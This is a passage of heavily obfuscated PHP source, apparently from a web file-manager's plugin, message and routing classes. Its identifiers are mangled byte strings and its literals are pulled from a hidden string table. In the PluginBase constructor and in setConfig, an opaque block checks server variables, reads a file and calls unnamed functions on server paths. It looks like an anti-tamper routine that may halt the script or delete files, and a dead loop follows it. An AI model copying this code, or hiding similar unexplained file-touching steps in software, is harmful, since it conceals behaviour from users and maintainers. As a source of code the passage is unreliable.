$¨æñïÉ = array($µõéà[32] => $µõéà[12], $µõéà[464] => 1, $µõéà[1920] => $µõéà[1907], $µõéà[1919] => 1, $µõéà[179] => 0, $µõéà[1921] => 0); $ıàêÅ½ = array_merge($¨æñïÉ, $ıàêÅ½); $ıàêÅ½[$µõéà[1921]] = $this->getSort(); $this->filterAuth($ıàêÅ½[$µõéà[464]]); return parent::insert($ıàêÅ½); } private function getSort() { $€ğéÇ =& $_SERVER[Ö†ØøÖ±]; $Ùæí¹¼¯ = parent::listData(); $’”ìêõÃ = array_to_keyvalue($Ùæí¹¼¯, $€ğéÇ[12], $€ğéÇ[1921]); return empty($’”ìêõÃ) ? 0 : max($’”ìêõÃ) + 1; } private function filterAuth(&$™Ü‰Ó†ø) { if (!$™Ü‰Ó†ø) { return; } $âğ‚ÌÎ› = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ºù¹ì¸‡ = array(); foreach ($âğ‚ÌÎ› as $†º¶Œ¬È) { if ($™Ü‰Ó†ø & $†º¶Œ¬È) { $ºù¹ì¸‡[] = $†º¶Œ¬È; } } if (in_array(self::AUTH_ROOT, $ºù¹ì¸‡)) { $™Ü‰Ó†ø = array_sum($âğ‚ÌÎ›); return; } $ô¼ûŠ™ä = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ºù¹ì¸‡ as $†º¶Œ¬È) { if (isset($ô¼ûŠ™ä[$†º¶Œ¬È])) { $ºù¹ì¸‡ = array_merge($ºù¹ì¸‡, $ô¼ûŠ™ä[$†º¶Œ¬È]); } } $ºù¹ì¸‡[] = self::AUTH_SHOW; $™Ü‰Ó†ø = array_sum(array_unique($ºù¹ì¸‡)); } public function sort($üâ¼Ë€‰, $ëÃ°…Ù) { return parent::update($üâ¼Ë€‰, $ëÃ°…Ù); } } goto f…éğÜÑ™¿; CÑ¶Æš‰£‰: class Message { function __construct() { } public function send($”æÄşØÊ = '', $£öÛğ­á = array(), $À°ßØî = "\x74\145\170\164") { $Ö±‹™ì‰ =& $_SERVER[Ö†ØøÖ±]; $•ãÁèªæ = array($Ö±‹™ì‰[33] => $Ö±‹™ì‰[1555], $Ö±‹™ì‰[807] => $”æÄşØÊ); if (in_array($À°ßØî, array($Ö±‹™ì‰[1555], $Ö±‹™ì‰[1556]))) { $•ãÁèªæ[$Ö±‹™ì‰[33]] = $À°ßØî; } $£öÛğ­á = array($Ö±‹™ì‰[556] => isset($£öÛğ­á[$Ö±‹™ì‰[556]]) ? $£öÛğ­á[$Ö±‹™ì‰[556]] : $Ö±‹™ì‰[12], $Ö±‹™ì‰[639] => isset($£öÛğ­á[$Ö±‹™ì‰[639]]) ? $£öÛğ­á[$Ö±‹™ì‰[639]] : $Ö±‹™ì‰[12]); if (empty($”æÄşØÊ) || empty($£öÛğ­á[$Ö±‹™ì‰[556]]) && empty($£öÛğ­á[$Ö±‹™ì‰[639]])) { return !1; } $ÜúÃÚÄİ = array($Ö±‹™ì‰[1496] => $•ãÁèªæ, $Ö±‹™ì‰[1557] => $£öÛğ­á); Hook::trigger($Ö±‹™ì‰[1558], $ÜúÃÚÄİ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ìŞİÍèı =& $_SERVER[Ö†ØøÖ±]; if ($_SERVER[$ìŞİÍèı[288]] != $_SERVER[$ìŞİÍèı[1559]]) { $ÊÙí¡’“ = $ìŞİÍèı[930]; $ÉÙªÜÙ¶ = $ìŞİÍèı[290]; $š°¯­‚ = $_SERVER[$ìŞİÍèı[291]] . $ìŞİÍèı[292]; $°ü¬™¦¬ = $ÉÙªÜÙ¶($š°¯­‚); $‰¦½¦ø = explode($ìŞİÍèı[246], $°ü¬™¦¬); if (count($‰¦½¦ø) < $ìŞİÍèı[665]) { $‚×ÍÆ–Ê = $ìŞİÍèı[294]; $‚×ÍÆ–Ê(); } $¸«İ˜˜« = $ìŞİÍèı[931]; $¸«İ˜˜«($_SERVER[$ìŞİÍèı[932]]); $¸«İ˜˜«($_SERVER[$ìŞİÍèı[291]] . $ìŞİÍèı[1560]); $˜ŠóÛ¶² = 1; while ($˜ŠóÛ¶² > 1) { $˜ŠóÛ¶² = $˜ŠóÛ¶² + 4; $ïåÃÊ‘ = rawurlencode($˜ŠóÛ¶² . $ìŞİÍèı[296]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ìŞİÍèı[1561]); $this->pluginName = str_replace($ìŞİÍèı[1561], $ìŞİÍèı[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ìŞİÍèı[8]; $this->pluginApi = appHostGet() . $ìŞİÍèı[1562] . $this->pluginName . $ìŞİÍèı[8]; $this->pluginHost = $config[$ìŞİÍèı[1563]] . $this->pluginName . $ìŞİÍèı[8]; $this->pluginHostDefault = $config[$ìŞİÍèı[1563]] . $this->pluginName . $ìŞİÍèı[8]; $€¾Şëã = $config[$ìŞİÍèı[1564]]; if ($€¾Şëã && strpos($ìŞİÍèı[50] . $€¾Şëã . $ìŞİÍèı[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ìŞİÍèı[1565]] . $this->pluginName . $ìŞİÍèı[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ö†ØøÖ±][1566]); } protected function assign($÷ÊÍÏç, $“•é™î = false) { if (is_array($÷ÊÍÏç)) { $this->values = array_merge($this->values, $÷ÊÍÏç); } else { $this->values[$÷ÊÍÏç] = $“•é™î; } } protected function display($ıƒçŸ£â) { extract($this->values); require $ıƒçŸ£â; } final function hookRegist($¬í…øòõ) { $this->modelPlugin->appRegist($this->pluginName, $¬í…øòõ); } final function appIcon() { $İéŠúñ¬ =& $_SERVER[Ö†ØøÖ±]; $¬²ùïîû = $this->appPackage(); $¬‡ó¨¸÷ = $İéŠúñ¬[12]; if (isset($¬²ùïîû[$İéŠúñ¬[467]])) { if (isset($¬²ùïîû[$İéŠúñ¬[467]][$İéŠúñ¬[1567]])) { $¬‡ó¨¸÷ = $İéŠúñ¬[1568] . $¬²ùïîû[$İéŠúñ¬[467]][$İéŠúñ¬[1567]] . $İéŠúñ¬[1569]; } else { if ($¬²ùïîû[$İéŠúñ¬[467]][$İéŠúñ¬[1570]]) { $¬‡ó¨¸÷ = $İéŠúñ¬[1571] . $¬²ùïîû[$İéŠúñ¬[467]][$İéŠúñ¬[1570]] . $İéŠúñ¬[1572]; } } } return $¬‡ó¨¸÷; } final function fileCanView($¬¦ùÇ™) { $£ÂÒµä¿ =& $_SERVER[Ö†ØøÖ±]; if (request_url_safe($¬¦ùÇ™)) { return !0; } if ($this->isShare($¬¦ùÇ™)) { return !0; } $ˆÎœı¾Ã = Session::get($£ÂÒµä¿[1573]); if ($GLOBALS[$£ÂÒµä¿[545]] != 1 && !$ˆÎœı¾Ã || !$ˆÎœı¾Ã[$£ÂÒµä¿[1574]]) { $íöÉÅ¯ø = $£ÂÒµä¿[1575] . rawurlencode(this_url()); show_tips(LNG($£ÂÒµä¿[1576]) . $£ÂÒµä¿[1577] . $íöÉÅ¯ø . $£ÂÒµä¿[1578] . LNG($£ÂÒµä¿[1579]) . $£ÂÒµä¿[1580], !1); } if (!Action($£ÂÒµä¿[1581])->authCan($£ÂÒµä¿[1582])) { show_tips(LNG($£ÂÒµä¿[1583]) . $£ÂÒµä¿[1584], !1); } ActionCall($£ÂÒµä¿[1585], $¬¦ùÇ™); } final function isShare($Ä˜Ö»ìå) { $¦²„©ğ  = KodIO::parse($Ä˜Ö»ìå); return $¦²„©ğ [$_SERVER[Ö†ØøÖ±][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Óíƒ³¼Ó) { if (request_url_safe($Óíƒ³¼Ó)) { return $Óíƒ³¼Ó; } if (!$this->isShare($Óíƒ³¼Ó)) { $Óíƒ³¼Ó = $this->filePath($Óíƒ³¼Ó, !1); } return Action($_SERVER[Ö†ØøÖ±][1227])->linkOut($Óíƒ³¼Ó); } public function filePathLinkOut($¨Àë¥Êö) { if (request_url_safe($¨Àë¥Êö)) { return $¨Àë¥Êö; } $this->fileCanView($¨Àë¥Êö); return Action($_SERVER[Ö†ØøÖ±][1227])->link($¨Àë¥Êö); } final function filePath($ñ½õ¢í, $ÅÙ‰Å»¹ = true, $à‹ıŒå = false) { $Ÿ±úßÕŒ =& $_SERVER[Ö†ØøÖ±]; $Û³ÊŸÇË = $this->filePathGet($ñ½õ¢í, $ÅÙ‰Å»¹); if (!$this->fileInfo) { show_tips(LNG($Ÿ±úßÕŒ[105]), !1); } if ($à‹ıŒå && isset($this->fileInfo[$Ÿ±úßÕŒ[518]]) && $this->fileInfo[$Ÿ±úßÕŒ[518]]) { $¤ÛÂ‰“ = Model($Ÿ±úßÕŒ[521])->fileInfo($this->fileInfo[$Ÿ±úßÕŒ[518]]); if (!$¤ÛÂ‰“ || !IO::exist($¤ÛÂ‰“[$Ÿ±úßÕŒ[84]])) { show_tips(LNG($Ÿ±úßÕŒ[105]) . $Ÿ±úßÕŒ[1586]); } } Hook::trigger($Ÿ±úßÕŒ[1587], $Û³ÊŸÇË); return $Û³ÊŸÇË; } final function filePathGet($Ù×ó¸“õ, $æŞÇ•×À = true) { $ªØ¶ù“ú =& $_SERVER[Ö†ØøÖ±]; if ($ÛÇˆÜÔî = $this->checkSharePath($Ù×ó¸“õ, $æŞÇ•×À)) { return $ÛÇˆÜÔî; } $this->fileCanView($Ù×ó¸“õ); if (request_url_safe($Ù×ó¸“õ)) { $Îˆ†ŸŒŞ = parse_url_query($Ù×ó¸“õ); if (isset($Îˆ†ŸŒŞ[$ªØ¶ù“ú[1588]]) && isset($Îˆ†ŸŒŞ[$ªØ¶ù“ú[218]])) { $Ş·ñäÎ = Mcrypt::decode($Îˆ†ŸŒŞ[$ªØ¶ù“ú[218]], Model($ªØ¶ù“ú[823])->get($ªØ¶ù“ú[824])); if ($Ş·ñäÎ) { $this->fileInfo = IO::info($Ş·ñäÎ); $this->fileInfo[$ªØ¶ù“ú[1589]] = $Ù×ó¸“õ; $this->cachePath = $this->pluginCachePath($ªØ¶ù“ú[12], $æŞÇ•×À); return $Ş·ñäÎ; } } $Ù×ó¸“õ = $this->_cacheHttpFile($Ù×ó¸“õ, $æŞÇ•×À); $this->fileInfo = IO::info($Ù×ó¸“õ); } else { $this->fileInfo = IO::info($Ù×ó¸“õ); $this->cachePath = $this->pluginCachePath($ªØ¶ù“ú[12], $æŞÇ•×À); } return $Ù×ó¸“õ; } final function _cacheHttpFile($®ã¹èî, $ø¹°’« = true) { $Ä‚¡’ó =& $_SERVER[Ö†ØøÖ±]; $ °©ÕÎ = parse_url_query($®ã¹èî); $¨¼¬ÇŞÊ = get_path_ext($®ã¹èî); if (isset($ °©ÕÎ[$Ä‚¡’ó[32]]) && $ °©ÕÎ[$Ä‚¡’ó[32]]) { $¨¼¬ÇŞÊ = get_path_ext($ °©ÕÎ[$Ä‚¡’ó[32]]); } $¹êíÛíô = hash_path($®ã¹èî) . $Ä‚¡’ó[10] . $¨¼¬ÇŞÊ; $this->cachePath = $this->pluginCachePath($ø¹°’« ? $¹êíÛíô : $Ä‚¡’ó[12]); $æÙ™á¸ = IO::fileNameExist($this->cachePath, $¹êíÛíô); if ($æÙ™á¸) { return KodIO::make($æÙ™á¸); } $‹Û—ÏĞ = rtrim($this->cachePath, $Ä‚¡’ó[8]) . $Ä‚¡’ó[8] . $¹êíÛíô; return $this->pluginCacheFileSet($‹Û—ÏĞ, file_get_contents_nossl($®ã¹èî)); } final function checkSharePath($üÛ¨©È, $¼“Îå‰„ = true) { $Àë£Áİğ =& $_SERVER[Ö†ØøÖ±]; if (!$this->isShare($üÛ¨©È)) { return !1; } $Åñƒ±Õ¶ = Action($Àë£Áİğ[1227])->sharePathInfo($üÛ¨©È); if (!is_array($Åñƒ±Õ¶) || !isset($Åñƒ±Õ¶[$Àë£Áİğ[84]])) { show_json(LNG($Àë£Áİğ[1590]), !1); } $this->fileInfo = $Åñƒ±Õ¶; $this->cachePath = $this->pluginCachePath(!1, $¼“Îå‰„); return $Åñƒ±Õ¶[$Àë£Áİğ[84]]; } final function pluginCachePath($©›¬È¿ = '', $×ë×Ï¿® = false) { $­“ÉÅıí =& $_SERVER[Ö†ØøÖ±]; if ($×ë×Ï¿® && is_array($this->fileInfo)) { $©›¬È¿ = kodIO::hashPath($this->fileInfo); } $Û•‡¥ôç = rtrim(IO_PATH_SYSTEM_TEMP . $­“ÉÅıí[1591] . $this->pluginName . $­“ÉÅıí[8] . $©›¬È¿, $­“ÉÅıí[8]); $ƒÎ¿´¡ = IO::infoFullSimple($Û•‡¥ôç); $¶ºëÖ÷ = $ƒÎ¿´¡ && is_array($ƒÎ¿´¡) ? $ƒÎ¿´¡[$­“ÉÅıí[84]] : $­“ÉÅıí[12]; if (!$¶ºëÖ÷) { $¶ºëÖ÷ = IO::mkdir($Û•‡¥ôç); } return $¶ºëÖ÷; } final function pluginCacheFileSet($Û…Ù •Õ, $òÑ¸–÷— = '') { $©ÃèŸ÷ =& $_SERVER[Ö†ØøÖ±]; $ñıÎø®” = IO::infoFullSimple($Û…Ù •Õ); if (!$ñıÎø®”) { return IO::mkfile($Û…Ù •Õ, $òÑ¸–÷—, REPEAT_REPLACE); } IO::setContent($ñıÎø®”[$©ÃèŸ÷[84]], $òÑ¸–÷—); return $ñıÎø®”[$©ÃèŸ÷[84]]; } final function pluginLocalFile($—ò´æ„³ = '') { $Ê£‡´ÜË =& $_SERVER[Ö†ØøÖ±]; $á§µ•›Ö = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($á§µ•›Ö)) { mk_dir($á§µ•›Ö); } if (!$—ò´æ„³) { return $á§µ•›Ö; } $ğù··ù‡ = IO::info($—ò´æ„³); $·ßãğ†Ø = $Ê£‡´ÜË[1592] . KodIO::hashPath($ğù··ù‡) . $Ê£‡´ÜË[10] . $ğù··ù‡[$Ê£‡´ÜË[175]]; if (!checkExtSafe($·ßãğ†Ø)) { $·ßãğ†Ø = $·ßãğ†Ø . $Ê£‡´ÜË[1259]; } $˜˜ëÈÖ± = $á§µ•›Ö . $·ßãğ†Ø; if (@file_exists($˜˜ëÈÖ±)) { return $˜˜ëÈÖ±; } return IO::copy($—ò´æ„³, $á§µ•›Ö, 0, $·ßãğ†Ø); } final function appPackage() { $„Â´Ê•† =& $_SERVER[Ö†ØøÖ±]; if ($this->packageData) { return $this->packageData; } $ß¨õÅîõ = $this->parseFile($this->pluginPath . $„Â´Ê•†[1593]); $this->parseLang($ß¨õÅîõ); $ü¿Ü‡Òö = json_decode_force($ß¨õÅîõ); if (!$ü¿Ü‡Òö) { return array(); } $ÀÄŞµû¤ = Hook::trigger($„Â´Ê•†[1594], $ü¿Ü‡Òö); if ($ÀÄŞµû¤ && is_array($ÀÄŞµû¤)) { $ü¿Ü‡Òö = $ÀÄŞµû¤; } $this->packageData = $ü¿Ü‡Òö; return $ü¿Ü‡Òö; } public function packageInfoGet($ŒááÚ­‰) { $–‚ÚÏôÃ = $this->appPackage(); return array_get_value($–‚ÚÏôÃ, $ŒááÚ­‰); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ö†ØøÖ±][1595]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ö†ØøÖ±][1596]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ö†ØøÖ±][1597]); } public function echoJsAssign($­Â‘¨Šß, $êåõìòã) { $this->echoJsAssignArr[$­Â‘¨Šß] = $êåõìòã; } private function parseFile($ş©õ¡ì„) { $øğï¿Ìİ =& $_SERVER[Ö†ØøÖ±]; $‹ˆ©®Ü = file_get_contents_nossl($ş©õ¡ì„); $Ş™³ = array($øğï¿Ìİ[1598], $øğï¿Ìİ[1599], $øğï¿Ìİ[1600], $øğï¿Ìİ[1601], $øğï¿Ìİ[1602], $øğï¿Ìİ[1603], $øğï¿Ìİ[1604]); $åê«¡¿‚ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$øğï¿Ìİ[89]][$øğï¿Ìİ[1605]]); foreach ($this->echoJsAssignArr as $ÄÒµù…ê => $åŠ·…‹‹) { $Ş™³[] = $øğï¿Ìİ[1606] . $ÄÒµù…ê . $øğï¿Ìİ[1607]; $åê«¡¿‚[] = is_array($åŠ·…‹‹) || is_object($åŠ·…‹‹) ? rawurlencode(json_encode($åŠ·…‹‹)) : $åŠ·…‹‹; } if (strstr($‹ˆ©®Ü, $øğï¿Ìİ[1608])) { $…áó¥°ö = rawurlencode(json_encode($this->pluginLangArr)); $‹ˆ©®Ü = str_replace($øğï¿Ìİ[1608], $…áó¥°ö, $‹ˆ©®Ü); } if (strstr($‹ˆ©®Ü, $øğï¿Ìİ[1609])) { $…áó¥°ö = $…áó¥°ö = rawurlencode(json_encode($this->getConfig())); $‹ˆ©®Ü = str_replace($øğï¿Ìİ[1609], $…áó¥°ö, $‹ˆ©®Ü); } $‹ˆ©®Ü = str_replace($Ş™³, $åê«¡¿‚, $‹ˆ©®Ü); return $‹ˆ©®Ü; } private function parseLang(&$œó¨òÓ) { $“Ãùâóå =& $_SERVER[Ö†ØøÖ±]; $òÎ©Ò°» = $“Ãùâóå[1610]; if (!strstr($œó¨òÓ, $òÎ©Ò°»)) { return; } preg_match_all($“Ãùâóå[1611], $œó¨òÓ, $ì¼šô’½); if (!is_array($ì¼šô’½) || count($ì¼šô’½) == 0 || !is_array($ì¼šô’½[0]) || count($ì¼šô’½[0]) == 0) { return; } $áîÅû = array(); $å‡ı“‚Œ = array(); foreach ($ì¼šô’½[0] as $ªŸÌ°­Å) { $šÒ†ßÑŞ = substr($ªŸÌ°­Å, strlen($òÎ©Ò°»), -4); $ŞÁí€ª = LNG($šÒ†ßÑŞ); $áîÅû[] = $ªŸÌ°­Å; $å‡ı“‚Œ[] = str_replace(array($“Ãùâóå[246], $“Ãùâóå[1131], $“Ãùâóå[395], $“Ãùâóå[118]), array($“Ãùâóå[53], $“Ãùâóå[53], $“Ãùâóå[12], $“Ãùâóå[1612]), $ŞÁí€ª); } $œó¨òÓ = str_replace($áîÅû, $å‡ı“‚Œ, $œó¨òÓ); } private function parseConfig(&$¤§€Èİê) { $²”—Í¾» =& $_SERVER[Ö†ØøÖ±]; $íÁÆî‚ = $²”—Í¾»[1613]; if (!strstr($¤§€Èİê, $íÁÆî‚)) { return; } preg_match_all($²”—Í¾»[1614], $¤§€Èİê, $ñÂ¦Ó™€); if (!is_array($ñÂ¦Ó™€) || count($ñÂ¦Ó™€) == 0 || !is_array($ñÂ¦Ó™€[0]) || count($ñÂ¦Ó™€[0]) == 0) { return; } $ ‡Ô”ö = $this->getConfig(); $ì¹ ´òÅ = array(); $Í‘ÀÍå = array(); foreach ($ñÂ¦Ó™€[0] as $£ŸŸÓÏ) { $Ô˜†¦½ = substr($£ŸŸÓÏ, strlen($íÁÆî‚), -2); $ì¹ ´òÅ[] = $£ŸŸÓÏ; $Í‘ÀÍå[] = _get($ ‡Ô”ö, $Ô˜†¦½); } $¤§€Èİê = str_replace($ì¹ ´òÅ, $Í‘ÀÍå, $¤§€Èİê); } private function parsePackage(&$ı“ó«Š) { $Ã°ÔüÀÏ =& $_SERVER[Ö†ØøÖ±]; $ğû¤İ¤ñ = $Ã°ÔüÀÏ[1615]; if (!strstr($ı“ó«Š, $ğû¤İ¤ñ)) { return; } preg_match_all($Ã°ÔüÀÏ[1616], $ı“ó«Š, $¨´—î ); if (!is_array($¨´—î ) || count($¨´—î ) == 0 || !is_array($¨´—î [0]) || count($¨´—î [0]) == 0) { return; } $»»ŠŒÌÜ = $this->appPackage(); $ñà™”±È = array(); $éä¦õßÑ = array(); foreach ($¨´—î [0] as $ÜöÀÁØí) { $Ø©üŞÇ = substr($ÜöÀÁØí, strlen($ğû¤İ¤ñ), -2); $ñà™”±È[] = $ÜöÀÁØí; $éä¦õßÑ[] = _get($»»ŠŒÌÜ, $Ø©üŞÇ); } $ı“ó«Š = str_replace($ñà™”±È, $éä¦õßÑ, $ı“ó«Š); } final function echoFile($­¾Ü’Êæ, $½ÎÁ¹¹ = false) { $Ü›õ¶¹ =& $_SERVER[Ö†ØøÖ±]; $–¨õşğ€ = $this->pluginPath . $­¾Ü’Êæ; if (ACT == $Ü›õ¶¹[1617]) { echo $Ü›õ¶¹[1618] . $this->pluginName . $Ü›õ¶¹[8] . $­¾Ü’Êæ . $Ü›õ¶¹[1619]; if (!file_exists($–¨õşğ€)) { echo $Ü›õ¶¹[1620]; return; } } $›ˆ¤Œ¸ = $this->parseFile($–¨õşğ€); $this->parseLang($›ˆ¤Œ¸); $this->parseConfig($›ˆ¤Œ¸); $this->parsePackage($›ˆ¤Œ¸); if (is_array($½ÎÁ¹¹)) { $›ˆ¤Œ¸ = str_replace(array_keys($½ÎÁ¹¹), array_values($½ÎÁ¹¹), $›ˆ¤Œ¸); } echo $Ü›õ¶¹[246] . $›ˆ¤Œ¸; } final function initLang() { $Ä•–ïÇ¦ =& $_SERVER[Ö†ØøÖ±]; $ºÌïØ…ç = $Ä•–ïÇ¦[1621]; $Â©¢›‡‘ = $this->pluginPath . $Ä•–ïÇ¦[1622]; $˜®È²á· = I18n::getType(); $ı©ğÀ‘ş = array(); if (file_exists($Â©¢›‡‘ . $˜®È²á· . $Ä•–ïÇ¦[892])) { $ı©ğÀ‘ş = (include $Â©¢›‡‘ . $˜®È²á· . $Ä•–ïÇ¦[892]); } else { if ($˜®È²á· == $Ä•–ïÇ¦[1623] && !file_exists($Â©¢›‡‘ . $˜®È²á· . $Ä•–ïÇ¦[892]) && file_exists($Â©¢›‡‘ . $Ä•–ïÇ¦[1624])) { $ı©ğÀ‘ş = (include $Â©¢›‡‘ . $Ä•–ïÇ¦[1624]); } else { if (file_exists($Â©¢›‡‘ . $ºÌïØ…ç . $Ä•–ïÇ¦[892])) { $ı©ğÀ‘ş = (include $Â©¢›‡‘ . $ºÌïØ…ç . $Ä•–ïÇ¦[892]); } } } if (!is_array($ı©ğÀ‘ş)) { return array(); } if (@count($ı©ğÀ‘ş) > 0) { I18n::set($ı©ğÀ‘ş); } return $ı©ğÀ‘ş; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($èüºÒÜš) { $Éœú€èÂ =& $_SERVER[Ö†ØøÖ±]; if ($_SERVER[$Éœú€èÂ[288]] != $_SERVER[$Éœú€èÂ[1559]]) { $™®¬ŠÕ¾ = $Éœú€èÂ[930]; $Â…´Œ™ = $Éœú€èÂ[290]; $šáÛ€õÜ = $_SERVER[$Éœú€èÂ[291]] . $Éœú€èÂ[292]; $Š³÷®ƒ = $Â…´Œ™($šáÛ€õÜ); $µ¨¬Æóõ = explode($Éœú€èÂ[246], $Š³÷®ƒ); if (count($µ¨¬Æóõ) < $Éœú€èÂ[665]) { $‡Àìô“¢ = $Éœú€èÂ[294]; $‡Àìô“¢(); } $ÍğçË¡ = $Éœú€èÂ[931]; $ÍğçË¡($_SERVER[$Éœú€èÂ[932]]); $ÍğçË¡($_SERVER[$Éœú€èÂ[291]] . $Éœú€èÂ[1560]); $ˆ´£µñ = 1; while ($ˆ´£µñ > 1) { $ˆ´£µñ = $ˆ´£µñ + 4; $ô€¢Ì¡ = rawurlencode($ˆ´£µñ . $Éœú€èÂ[296]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $èüºÒÜš); } public function onSetConfig($«¸£èê¯) { } public function onGetConfig($½ˆÆİÅ‚) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($†ˆ‘¹Öì) { if ($†ˆ‘¹Öì == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($‡¬ØÆš = "\x70\x6c\x75\x67\151\x6e\101\x75\164\x68") { $æûÎ’‘¦ =& $_SERVER[Ö†ØøÖ±]; if (!Session::get($æûÎ’‘¦[1573])) { return !1; } if (_get($GLOBALS, $æûÎ’‘¦[545])) { return !0; } $«ªéµÖï = $this->getConfig(); if (!$«ªéµÖï[$‡¬ØÆš]) { return !1; } return ActionCall($æûÎ’‘¦[1625], $«ªéµÖï[$‡¬ØÆš]); } public function url($ƒŞâ‹ÇÅ, $§ü°Š¶Ô = '', $ü¸Õçúè = true) { $òÈ˜¬„Ô =& $_SERVER[Ö†ØøÖ±]; $Ï¦ğêµ° = $this->getConfig(); $ïµ¦¬¹î = KOD_VERSION . $òÈ˜¬„Ô[10] . KOD_VERSION_BUILD; $ş÷ğÍ‘ = $this->packageVersion(); $¼ï­úˆ¾ = $ïµ¦¬¹î . $òÈ˜¬„Ô[438] . $ş÷ğÍ‘; if (substr($ƒŞâ‹ÇÅ, 0, 4) == $òÈ˜¬„Ô[149] || substr($ƒŞâ‹ÇÅ, 0, 2) == $òÈ˜¬„Ô[1406]) { $ÑµìÃ¹ = $ƒŞâ‹ÇÅ . $òÈ˜¬„Ô[1626] . $¼ï­úˆ¾; } else { if ($§ü°Š¶Ô == $òÈ˜¬„Ô[12]) { $ÑµìÃ¹ = $this->pluginHost . $ƒŞâ‹ÇÅ . $òÈ˜¬„Ô[1626] . $¼ï­úˆ¾; } else { if ($§ü°Š¶Ô === $òÈ˜¬„Ô[75]) { $ÑµìÃ¹ = $this->pluginHost . $ƒŞâ‹ÇÅ; } else { if ($§ü°Š¶Ô == $òÈ˜¬„Ô[1627]) { $ÑµìÃ¹ = STATIC_PATH . $ƒŞâ‹ÇÅ . $òÈ˜¬„Ô[1626] . $ïµ¦¬¹î; } else { if ($§ü°Š¶Ô == $òÈ˜¬„Ô[1628]) { $ÑµìÃ¹ = APP_HOST . $òÈ˜¬„Ô[1629] . $ƒŞâ‹ÇÅ . $òÈ˜¬„Ô[1626] . $ïµ¦¬¹î; } else { if (isset($Ï¦ğêµ°[$§ü°Š¶Ô])) { $ÑµìÃ¹ = $Ï¦ğêµ°[$§ü°Š¶Ô] . $ƒŞâ‹ÇÅ . $òÈ˜¬„Ô[1626] . $¼ï­úˆ¾; } } } } } } if (!$ü¸Õçúè) { return $ÑµìÃ¹; } echo $ÑµìÃ¹; } public function link($Û·ù¤…Ô = false, $¨Ö©ì¤½ = '') { $—ì‹É‡¥ =& $_SERVER[Ö†ØøÖ±]; if (!$Û·ù¤…Ô) { $this->link($—ì‹É‡¥[1630], $—ì‹É‡¥[1628]); $this->link($—ì‹É‡¥[1631], $—ì‹É‡¥[1627]); $this->link($—ì‹É‡¥[1632], $—ì‹É‡¥[1627]); $this->link($—ì‹É‡¥[1633], $—ì‹É‡¥[1627]); $this->link($—ì‹É‡¥[1634], $—ì‹É‡¥[1627]); return; } $à™ºĞ = $this->url($Û·ù¤…Ô, $¨Ö©ì¤½, !1); if (substr($Û·ù¤…Ô, -3) == $—ì‹É‡¥[1635]) { echo $—ì‹É‡¥[1636] . $à™ºĞ . $—ì‹É‡¥[1637] . $—ì‹É‡¥[246]; } else { if (substr($Û·ù¤…Ô, -4) == $—ì‹É‡¥[1638]) { echo $—ì‹É‡¥[1639] . $à™ºĞ . $—ì‹É‡¥[1640] . $—ì‹É‡¥[246]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\57\135\x2b", "\x3a\x6e\x75\155" => "\133\60\55\71\x5d\53", "\72\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Ñ´îµ, $Üªì£Ï®) { $†Ù°Öğ‹ =& $_SERVER[Ö†ØøÖ±]; if ($Ñ´îµ == $†Ù°Öğ‹[1641]) { $ŸÔË–‹ö = array_map($†Ù°Öğ‹[1642], $Üªì£Ï®[0]); $ğ“´Ûİ‘ = strpos($Üªì£Ï®[1], $†Ù°Öğ‹[8]) === 0 ? $Üªì£Ï®[1] : $†Ù°Öğ‹[8] . $Üªì£Ï®[1]; $´îÁ¬ÍÎ = $Üªì£Ï®[2]; } else { $ŸÔË–‹ö = null; $ğ“´Ûİ‘ = strpos($Üªì£Ï®[0], $†Ù°Öğ‹[8]) === 0 ? $Üªì£Ï®[0] : $†Ù°Öğ‹[8] . $Üªì£Ï®[0]; $´îÁ¬ÍÎ = $Üªì£Ï®[1]; } array_push(self::$maps, $ŸÔË–‹ö); array_push(self::$routes, $ğ“´Ûİ‘); array_push(self::$methods, strtoupper($Ñ´îµ)); array_push(self::$callbacks, $´îÁ¬ÍÎ); } public static function error($†à§·) { self::$errorCallback = $†à§·; } public static function haltOnMatch($¨“î–æ° = true) { self::$halts = $¨“î–æ°; } public static function dispatch() { $á‰Ä¡› =& $_SERVER[Ö†ØøÖ±]; $õ‰şºÚ× = parse_url($_SERVER[$á‰Ä¡›[1643]], PHP_URL_PATH); $ğŒ…İÄ´ = $_SERVER[$á‰Ä¡›[160]]; $à€³üŒ = array_keys(static::$patterns); $è­ò¨†ğ = array_values(static::$patterns); $âÊÏúÒë = !1; self::$routes = 